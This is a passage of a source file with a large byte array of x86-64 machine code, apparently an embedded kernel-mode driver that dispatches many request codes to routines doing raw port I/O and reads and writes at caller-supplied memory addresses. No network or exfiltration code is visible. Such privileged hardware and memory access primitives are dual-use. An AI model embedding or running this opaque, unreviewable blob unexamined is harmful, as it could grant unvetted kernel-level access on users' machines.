		0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x50, 0x48, 0x89, 0x7C, 0x24,
		0x58, 0x48, 0x8B, 0xF9, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x76, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x01, 0x48, 0xFF, 0xC8, 0x48, 0x83, 0xF8, 0x3A, 0x0F, 0x87, 0x61, 0x05, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x0A, 0xEC, 0xFF, 0xFF, 0x8B, 0x84,
		0x81, 0x68, 0x19, 0x00, 0x00, 0x48, 0x03, 0xC1, 0xFF, 0xE0, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x15, 0x08, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38,
		0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x06, 0x08, 0x00, 0x00, 0x33, 0xDB, 0x66, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xF6, 0x07,
		0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x0F, 0xB6, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xE3, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88,
		0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x0F, 0xB7, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xD0, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48,
		0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xCE, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
		0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xBF, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48,
		0x8B, 0x4F, 0x18, 0xE8, 0xC0, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x66, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xC0, 0x07, 0x00, 0x00,
		0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x0F, 0xB6, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xBD, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10,
		0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x0F, 0xB7, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xBA, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C,
		0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xB8, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24,
		0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x57, 0x20, 0x4C, 0x8D, 0x47, 0x28, 0x48, 0x8D, 0x4F, 0x18, 0xE8, 0x21, 0x15, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50,
		0x48, 0x83, 0xC4, 0x38, 0xC3, 0x44, 0x8B, 0x47, 0x28, 0x48, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xFA, 0x0B, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48,
		0x83, 0xC4, 0x38, 0xC3, 0xE8, 0xCF, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xE8, 0x53, 0x0E, 0x00, 0x00, 0x33, 0xDB, 0x48,
		0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x4F, 0x10, 0xE8, 0x34, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C,
		0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x4F, 0x10, 0xE8, 0x89, 0x0D, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xBD,
		0x09, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x57, 0x1C, 0x8B, 0x4F, 0x18, 0x33, 0xDB, 0x4C, 0x8D, 0x47, 0x20, 0x45, 0x33,
		0xC9, 0x89, 0x5C, 0x24, 0x20, 0xE8, 0x2E, 0x12, 0x00, 0x00, 0x48, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x10, 0x45, 0x33, 0xC0, 0x33, 0xD2,
		0xE8, 0x3B, 0x12, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0x48, 0x85, 0xC9, 0x74, 0x1F, 0x4C, 0x8B, 0x47, 0x20, 0x8B, 0x57, 0x10,
		0xE8, 0xA3, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8D, 0x0D, 0x19, 0x34, 0x00, 0x00, 0xE8, 0x44, 0x08, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B,
		0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0x48, 0x85, 0xC9, 0x74, 0x25, 0x48, 0x8B, 0x57, 0x10, 0x48, 0x85, 0xD2, 0x74, 0x1C, 0x4C, 0x8B, 0x47, 0x20, 0xE8, 0x88, 0x07, 0x00, 0x00,
		0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8D, 0x0D, 0x8E, 0x33, 0x00, 0x00, 0xE8, 0xF9, 0x07, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
		0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0x48, 0x85, 0xC9, 0x74, 0x25, 0x48, 0x8B, 0x57, 0x10, 0x48, 0x85, 0xD2, 0x74, 0x1C, 0x4C, 0x8B, 0x47, 0x20, 0xE8, 0x3D, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48,
		0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8D, 0x0D, 0x03, 0x33, 0x00, 0x00, 0xE8, 0xAE, 0x07, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83,
		0xC4, 0x38, 0xC3, 0x4C, 0x8B, 0x47, 0x20, 0x48, 0x8B, 0x57, 0x10, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xFC, 0x06, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48,
		0x8B, 0x4F, 0x18, 0xE8, 0x10, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x11, 0x07, 0x00, 0x00, 0x33,
		0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x44, 0x8B, 0x47, 0x24, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x0B, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x89,
		0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x83, 0xC7, 0x10, 0x74, 0x3F, 0x0F, 0xB6, 0x0F, 0xE8, 0xD7, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C,
		0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x83, 0xC7, 0x10, 0x74, 0x1E, 0x48, 0x8D, 0x4F, 0x04, 0xE8, 0xE5, 0x06, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x07, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
		0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8D, 0x0D, 0xD9, 0x31, 0x00, 0x00, 0xE8, 0xC4, 0x06, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x4C, 0x8B, 0x47,
		0x28, 0x8B, 0x57, 0x1C, 0x8B, 0x4F, 0x18, 0x33, 0xDB, 0x4C, 0x8D, 0x4F, 0x20, 0x89, 0x5C, 0x24, 0x28, 0x48, 0x89, 0x5C, 0x24, 0x20, 0xE8, 0x85, 0x0C, 0x00, 0x00, 0x48, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
		0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x57, 0x18, 0x48, 0x8B, 0x4F, 0x10, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xE8, 0xAD, 0x0E, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24,
		0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x4C, 0x8B, 0x4F, 0x30, 0x48, 0x8B, 0x57, 0x20, 0x4C, 0x8D, 0x47, 0x28, 0x48, 0x8D, 0x4F, 0x18, 0xE8, 0xD5, 0x10, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48,
		0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x4C, 0x8B, 0x4F, 0x30, 0x44, 0x8B, 0x47, 0x28, 0x48, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x0A, 0x09, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C,
		0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xA7, 0x04, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
		0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xBB, 0x18, 0x20, 0x6A, 0xC8, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x66, 0x90, 0x02, 0x14, 0x00, 0x00, 0x21, 0x14, 0x00, 0x00,
		0x41, 0x14, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x60, 0x14, 0x00, 0x00, 0x83, 0x14, 0x00, 0x00, 0xA6, 0x14, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
		0xC8, 0x14, 0x00, 0x00, 0xE7, 0x14, 0x00, 0x00, 0x07, 0x15, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x26, 0x15, 0x00, 0x00, 0x49, 0x15, 0x00, 0x00, 0x6C, 0x15, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
		0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x8E, 0x15, 0x00, 0x00, 0xB5, 0x15, 0x00, 0x00, 0xDC, 0x15, 0x00, 0x00, 0xF8, 0x15, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
		0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x2F, 0x16, 0x00, 0x00, 0x14, 0x16, 0x00, 0x00, 0x4A, 0x16, 0x00, 0x00, 0x6A, 0x16, 0x00, 0x00, 0x97, 0x16, 0x00, 0x00, 0xB7, 0x17, 0x00, 0x00, 0xD6, 0x17, 0x00, 0x00, 0xF5, 0x17, 0x00, 0x00,
		0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x3C, 0x18, 0x00, 0x00, 0xB8, 0x16, 0x00, 0x00, 0xFD, 0x16, 0x00, 0x00, 0x48, 0x17, 0x00, 0x00, 0x93, 0x17, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
		0x50, 0x19, 0x00, 0x00, 0x1B, 0x18, 0x00, 0x00, 0x7D, 0x18, 0x00, 0x00, 0xB0, 0x18, 0x00, 0x00, 0xD6, 0x18, 0x00, 0x00, 0x01, 0x19, 0x00, 0x00, 0x2C, 0x19, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x53, 0x48, 0x81, 0xEC, 0x30, 0x01, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x70, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x01, 0x48, 0xFF, 0xC8, 0x48, 0x83, 0xF8, 0x06, 0x0F, 0x87, 0x5B, 0x01,
		0x00, 0x00, 0x48, 0x8D, 0x0D, 0x6F, 0xE5, 0xFF, 0xFF, 0x8B, 0x84, 0x81, 0xF4, 0x1B, 0x00, 0x00, 0x48, 0x03, 0xC1, 0xFF, 0xE0, 0xE8, 0x9E, 0x1C, 0x00, 0x00, 0x66, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B,
		0xC3, 0x48, 0x8D, 0x53, 0x14, 0x48, 0x8D, 0x4B, 0x18, 0xE8, 0x12, 0x1D, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x53, 0x18, 0x41, 0xB8, 0x08,
		0x01, 0x00, 0x00, 0xE8, 0xD0, 0x27, 0x00, 0x00, 0x44, 0x8B, 0x83, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x93, 0x24, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0xB8, 0x1D, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4,
		0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x53, 0x18, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x96, 0x27, 0x00, 0x00, 0x8B, 0x93, 0x20, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x83, 0x24, 0x01, 0x00, 0x00, 0x48,
		0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x4F, 0x1E, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x53, 0x18, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x5D,
		0x27, 0x00, 0x00, 0x44, 0x8B, 0x83, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x93, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x96, 0x1E, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3,
		0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x53, 0x18, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x24, 0x27, 0x00, 0x00, 0x44, 0x8B, 0x8B, 0x28, 0x01, 0x00, 0x00, 0x44, 0x0F, 0xB6, 0x83, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x93, 0x20, 0x01, 0x00,
		0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x75, 0x1F, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x53, 0x18, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00,
		0xE8, 0xE3, 0x26, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x29, 0x15, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0xB8, 0x18, 0x20, 0x6A, 0xC8, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00,
		0x00, 0x5B, 0xC3, 0x90, 0x9D, 0x1A, 0x00, 0x00, 0xB1, 0x1A, 0x00, 0x00, 0xCC, 0x1A, 0x00, 0x00, 0x06, 0x1B, 0x00, 0x00, 0x3F, 0x1B, 0x00, 0x00, 0x78, 0x1B, 0x00, 0x00, 0xB9, 0x1B, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x0F, 0xB7, 0xD1, 0xEC, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x0F, 0xB7, 0xD1, 0x66, 0xED, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x0F, 0xB7, 0xD1, 0xED, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x0F, 0xB6, 0xC2, 0x0F, 0xB7, 0xD1, 0xEE, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x0F, 0xB7, 0xC2, 0x0F, 0xB7, 0xD1, 0x66, 0xEF,
		0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x8B, 0xC2, 0x0F, 0xB7, 0xD1, 0xEF, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x85, 0xC9, 0x74, 0x04, 0x0F, 0xB6, 0x01, 0xC3, 0x32, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x85, 0xC9, 0x74, 0x04, 0x0F, 0xB7, 0x01,
		0xC3, 0x66, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x85, 0xC9, 0x74, 0x03, 0x8B, 0x01, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x85, 0xC9, 0x74, 0x0A, 0x88, 0x11, 0xF0, 0x83, 0x0C, 0x24, 0x00, 0xB0, 0x01, 0xC3, 0x32, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x85, 0xC9, 0x74, 0x0B, 0x66, 0x89, 0x11, 0xF0, 0x83, 0x0C, 0x24, 0x00, 0xB0, 0x01, 0xC3, 0x32, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x85, 0xC9, 0x74, 0x0A, 0x89, 0x11, 0xF0, 0x83, 0x0C, 0x24, 0x00, 0xB0, 0x01, 0xC3, 0x32, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xB8, 0x1F, 0x85, 0xEB,
		0x51, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x8B, 0xD9, 0xF7, 0xE1, 0xC1, 0xEA, 0x04, 0x74, 0x21, 0x48, 0x89, 0x7C, 0x24, 0x48, 0x8B, 0xFA, 0x66, 0x90, 0xB9, 0x32, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x85, 0x42, 0x00, 0x00, 0x83, 0xC3, 0xCE, 0x48, 0xFF,
		0xCF, 0x75, 0xED, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x85, 0xDB, 0x74, 0x08, 0x8B, 0xCB, 0xFF, 0x15, 0x6C, 0x42, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x33, 0xC9, 0x48, 0xFF, 0x25, 0x4F, 0x42, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x08, 0x33, 0xD2, 0xFF, 0x15, 0x67, 0x42, 0x00,
		0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x85, 0xD2, 0x74, 0x6D, 0x45, 0x33, 0xC9, 0x48, 0x8D, 0x05, 0x91, 0x53, 0x00, 0x00, 0x4C, 0x8D, 0x15, 0x0A, 0xE2, 0xFF, 0xFF, 0x45, 0x33,
		0xC0, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x4B, 0x39, 0x94, 0x10, 0x60, 0x7A, 0x3D, 0x00, 0x75, 0x0A, 0x4B, 0x3B, 0x8C, 0x10, 0x40, 0x7A, 0x3D, 0x00, 0x74, 0x21, 0x48, 0x39, 0x50, 0x08, 0x75, 0x05, 0x48, 0x3B, 0x08, 0x74, 0x24, 0x49,
		0x83, 0xC0, 0x28, 0x49, 0xFF, 0xC1, 0x48, 0x83, 0xC0, 0x50, 0x49, 0x81, 0xF8, 0x80, 0x84, 0x1E, 0x00, 0x72, 0xCD, 0xEB, 0x1D, 0x4B, 0x8D, 0x04, 0x89, 0x49, 0x8B, 0x8C, 0xC2, 0x48, 0x7A, 0x3D, 0x00, 0xEB, 0x0F, 0x4B, 0x8D, 0x04, 0x89, 0x48,
